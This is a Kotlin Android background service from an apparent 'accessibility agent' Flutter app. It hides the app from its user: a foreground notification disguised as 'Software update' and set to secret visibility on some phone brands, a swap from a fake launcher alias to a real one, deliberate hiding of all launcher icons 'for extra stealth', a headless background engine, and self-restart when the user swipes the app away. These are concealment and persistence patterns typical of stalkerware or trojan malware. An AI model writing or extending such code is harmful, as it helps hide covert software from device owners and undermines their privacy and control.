package com.example.cyber_accessibility_agent

import android.app.*
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.embedding.engine.dart.DartExecutor
import io.flutter.embedding.engine.loader.FlutterLoader
import io.flutter.plugin.common.MethodChannel

class AgentService : Service() {

    companion object {
        const val ACTION_START = "com.example.cyber_accessibility_agent.START_AGENT"
        private const val NOTIF_ID = 9991
        private const val CHANNEL_ID = "agent_service_channel"
        private const val TAG = "AgentService"

        // ✅ SharedPreferences keys for offline-first
        private const val PREF_LAUNCHER_SWITCHED = "launcher_switched"
        private const val PREF_AGENT_STARTED = "agent_started"
        private const val PREF_REGISTRATION_PENDING = "registration_pending"
        private const val PREF_DEVICE_ID = "device_id"
    }

    private var flutterEngine: FlutterEngine? = null

    // Handler for delayed operations
    private val mainHandler = Handler(Looper.getMainLooper())

    /**
     * ✅ Plain SharedPreferences
     */
    private fun prefs() = getSharedPreferences("agent_prefs", Context.MODE_PRIVATE)

    override fun onCreate() {
        super.onCreate()

        AppLogger.logLifecycle("AgentService.onCreate")

        try {
            // ✅ STEP 1: Start foreground IMMEDIATELY (fake header ok for milliseconds)
            createNotificationChannel()
            startForeground(NOTIF_ID, buildNotification())
            AppLogger.i(TAG, "✅ Foreground service started")

            // ✅ STEP 2: Mark agent as started (offline-first)
            prefs().edit()
                .putBoolean(PREF_AGENT_STARTED, true)
                .apply()
            AppLogger.i(TAG, "Agent started flag set")

            // ✅ STEP 3: Switch launcher alias to REAL (enable real, disable fake)
            switchLauncherAliasToReal()

            // ✅ STEP 4: Recreate foreground notification so system re-reads header
            refreshForegroundNotification()

            // ✅ STEP 5: Hide launcher icons AFTER notification is correct (give time)
            mainHandler.postDelayed({
                hideAllLauncherIcons()
            }, 2000)

        } catch (e: Exception) {
            AppLogger.e(TAG, "Failed in onCreate", e)
        }
    }

    /**
     * Switch launcher alias to Real: enable RealLauncher, disable FakeLauncher.
     * Marks PREF_LAUNCHER_SWITCHED = true once done.
     */
    private fun switchLauncherAliasToReal() {
        val alreadySwitched = prefs().getBoolean(PREF_LAUNCHER_SWITCHED, false)

        if (alreadySwitched) {
            AppLogger.d(TAG, "Launcher already switched - ensuring RealLauncher enabled")
            ensureRealLauncherEnabled()
            return
        }

        try {
            val pm = packageManager
            val pkg = packageName

            AppLogger.i(TAG, "Switching launcher alias: fake -> real...")

            // Enable RealLauncher (so Settings/launcher can show original icon/label)
            try {
                val realComponent = ComponentName(pkg, "$pkg.RealLauncher")
                pm.setComponentEnabledSetting(
                    realComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
                AppLogger.i(TAG, "✅ RealLauncher enabled")
            } catch (e: Exception) {
                AppLogger.w(TAG, "Enabling RealLauncher failed: ${e.message}")
            }

            // Disable FakeLauncher
            try {
                val fakeComponent = ComponentName(pkg, "$pkg.FakeLauncher")
                pm.setComponentEnabledSetting(
                    fakeComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                AppLogger.i(TAG, "✅ FakeLauncher disabled")
            } catch (e: Exception) {
                AppLogger.w(TAG, "Disabling FakeLauncher failed: ${e.message}")
            }

            // Mark as switched
            prefs().edit()
                .putBoolean(PREF_LAUNCHER_SWITCHED, true)
                .apply()

            AppLogger.i(TAG, "✅ Launcher alias switched to real (preferences updated)")

        } catch (e: Exception) {
            AppLogger.e(TAG, "Failed to switch launcher alias to real", e)
        }
    }

    /**
     * Ensure the RealLauncher component is enabled (used when prefs flag set).
     */
    private fun ensureRealLauncherEnabled() {
        try {
            val pm = packageManager
            val pkg = packageName

            val realComponent = ComponentName(pkg, "$pkg.RealLauncher")
            pm.setComponentEnabledSetting(
                realComponent,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )

            // Optionally disable fake as defensive step
            val fakeComponent = ComponentName(pkg, "$pkg.FakeLauncher")
            pm.setComponentEnabledSetting(
                fakeComponent,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )

            AppLogger.d(TAG, "Verified RealLauncher enabled and FakeLauncher disabled")

        } catch (e: Exception) {
            AppLogger.e(TAG, "Failed to ensure RealLauncher enabled", e)
        }
    }

    /**
     * Ensure both launchers are disabled (kept for compatibility)
     */
    private fun ensureBothLaunchersDisabled() {
        try {
            val pm = packageManager
            val pkg = packageName

            val fakeComponent = ComponentName(pkg, "$pkg.FakeLauncher")
            val realComponent = ComponentName(pkg, "$pkg.RealLauncher")

            pm.setComponentEnabledSetting(
                fakeComponent,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )

            pm.setComponentEnabledSetting(
                realComponent,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )

            AppLogger.d(TAG, "Verified both launchers disabled")

        } catch (e: Exception) {
            AppLogger.e(TAG, "Failed to verify launcher state", e)
        }
    }

    /**
     * AGGRESSIVE icon hiding using multiple methods
     */
    private fun hideAllLauncherIcons() {
        try {
            AppLogger.i(TAG, "Hiding all launcher icons aggressively...")

            // Method 1: Use AppHider (if available)
            try {
                val hidden1 = AppHider.hide(this)
                AppLogger.i(TAG, "AppHider.hide() result: $hidden1")
            } catch (e: Exception) {
                AppLogger.w(TAG, "AppHider.hide() threw: ${e.message}")
            }

            // Method 2: Disable MainActivity component directly
            try {
                val pm = packageManager
                val mainComponent = ComponentName(packageName, "$packageName.MainActivity")
                pm.setComponentEnabledSetting(
                    mainComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                AppLogger.i(TAG, "✅ MainActivity component disabled")
            } catch (e: Exception) {
                AppLogger.w(TAG, "MainActivity disable failed (may be okay): ${e.message}")
            }

            // Optionally also disable RealLauncher and FakeLauncher for extra stealth
            try {
                val pm = packageManager
                val pkg = packageName
                val realComponent = ComponentName(pkg, "$pkg.RealLauncher")
                val fakeComponent = ComponentName(pkg, "$pkg.FakeLauncher")

                pm.setComponentEnabledSetting(
                    realComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                pm.setComponentEnabledSetting(
                    fakeComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )

                AppLogger.i(TAG, "✅ RealLauncher & FakeLauncher disabled (final hide step)")
            } catch (e: Exception) {
                AppLogger.w(TAG, "Disabling launchers during hideAllLauncherIcons failed: ${e.message}")
            }

            AppLogger.i(TAG, "✅ All icon hiding methods applied")

        } catch (e: Exception) {
            AppLogger.e(TAG, "Failed to hide icons", e)
        }
    }

    override fun onStartCommand(intent: android.content.Intent?, flags: Int, startId: Int): Int {
        AppLogger.d(TAG, "onStartCommand: action=${intent?.action}")

        if (flutterEngine == null) {
            AppLogger.i(TAG, "Initializing Flutter engine...")
            initFlutter()
        } else {
            AppLogger.d(TAG, "Flutter engine already initialized")
        }

        return START_STICKY
    }

    /**
     * Initialize headless Flutter engine
     */
    private fun initFlutter() {
        AppLogger.d(TAG, "initFlutter() called on ${Thread.currentThread().name}")

        try {
            val loader = FlutterLoader()

            AppLogger.d(TAG, "Starting Flutter initialization...")
            loader.startInitialization(applicationContext)
            loader.ensureInitializationComplete(applicationContext, null)
            AppLogger.i(TAG, "Flutter loader initialized")

            val engine = FlutterEngine(applicationContext)

            AppLogger.d(TAG, "Executing Dart entrypoint: backgroundMain")
            val entrypoint = DartExecutor.DartEntrypoint(
                loader.findAppBundlePath(),
                "backgroundMain"
            )
            engine.dartExecutor.executeDartEntrypoint(entrypoint)

            MethodChannel(engine.dartExecutor.binaryMessenger, "agent/status")
                .setMethodCallHandler { call, result ->
                    when (call.method) {
                        "updateStatus" -> {
                            AppLogger.d(TAG, "Received updateStatus call")
                            result.success(true)
                        }
                        else -> result.notImplemented()
                    }
                }

            flutterEngine = engine
            AppLogger.i(TAG, "✅ Headless FlutterEngine started successfully")

        } catch (e: Exception) {
            AppLogger.e(TAG, "❌ Failed to start FlutterEngine", e)
        }
    }

    /**
     * Create notification channel
     */
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val name = "Background Service"
            val descriptionText = "Keeps the app running in background"
            val importance = NotificationManager.IMPORTANCE_LOW
            val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
                description = descriptionText
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }

            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)

            AppLogger.d(TAG, "Notification channel created")
        }
    }

    /**
     * Build notification with OEM-specific tweaks
     *
     * Note: header app label/icon is controlled by System; we recreate the foreground
     * notification after enabling RealLauncher so System re-reads the label/icon.
     */
    private fun buildNotification(): Notification {
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Software update")
            .setContentText("Software updates are available.")
            .setSmallIcon(R.drawable.ic_notification) // keep this neutral; system header label comes from package/alias
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setShowWhen(false)

        val manufacturer = Build.MANUFACTURER.lowercase()

        when {
            manufacturer.contains("tecno") ||
                    manufacturer.contains("infinix") ||
                    manufacturer.contains("itel") -> {
                builder.setVisibility(NotificationCompat.VISIBILITY_SECRET)
                AppLogger.d(TAG, "Using transparent notification for Tecno/Infinix/Itel")
            }

            manufacturer.contains("samsung") -> {
                builder.setVisibility(NotificationCompat.VISIBILITY_PRIVATE)
                AppLogger.d(TAG, "Using private notification for Samsung")
            }

            manufacturer.contains("xiaomi") ||
                    manufacturer.contains("redmi") ||
                    manufacturer.contains("poco") -> {
                builder.setVisibility(NotificationCompat.VISIBILITY_PRIVATE)
                AppLogger.d(TAG, "Using private notification for Xiaomi/Redmi/Poco")
            }

            else -> {
                builder.setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
                AppLogger.d(TAG, "Using public notification (default)")
            }
        }

        return builder.build()
    }

    /**
     * Recreate foreground notification so Android re-reads app label/icon
     * Steps: stopForeground(true) -> delay -> startForeground(...)
     */
    private fun refreshForegroundNotification() {
        try {
            AppLogger.i(TAG, "Refreshing foreground notification to apply real app name/icon")

            // Remove old notification (with fake header)
            stopForeground(true)

            // Give PackageManager / System UI time to pick up the alias change
            mainHandler.postDelayed({
                try {
                    startForeground(NOTIF_ID, buildNotification())
                    AppLogger.i(TAG, "Foreground notification restarted with updated header (if System applied alias)")
                } catch (e: Exception) {
                    AppLogger.e(TAG, "Failed to restart foreground during refresh", e)
                }
            }, 600) // 500-700ms is a good compromise for most OEMs

        } catch (e: Exception) {
            AppLogger.e(TAG, "Failed to refresh foreground notification", e)
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        AppLogger.logLifecycle("AgentService.onDestroy")

        try {
            flutterEngine?.destroy()
            flutterEngine = null
            AppLogger.i(TAG, "Flutter engine destroyed")
        } catch (e: Exception) {
            AppLogger.e(TAG, "Error destroying Flutter engine", e)
        }

        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        AppLogger.i(TAG, "onTaskRemoved - restarting service")

        // Restart service when task is removed (swipe away)
        val restartServiceIntent = Intent(applicationContext, AgentService::class.java).apply {
            action = ACTION_START
        }
        val restartServicePendingIntent = PendingIntent.getService(
            applicationContext,
            1,
            restartServiceIntent,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                PendingIntent.FLAG_MUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            } else {
                PendingIntent.FLAG_UPDATE_CURRENT
            }
        )

        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.set(
            AlarmManager.ELAPSED_REALTIME,
            android.os.SystemClock.elapsedRealtime() + 1000,
            restartServicePendingIntent
        )
    }
}